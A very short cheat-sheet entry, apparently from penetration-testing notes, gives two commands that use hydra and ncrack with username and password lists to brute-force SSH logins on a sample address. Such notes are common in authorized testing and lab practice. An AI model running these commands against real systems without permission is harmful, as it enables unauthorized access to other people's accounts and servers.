# Password cracking
### Cracking SSH Password

```bash
hydra -L <username list> -P <password list> 10.10.10.10 ssh
ncrack -U <usernames list> -P <passwords list> ssh://10.10.10.10
```
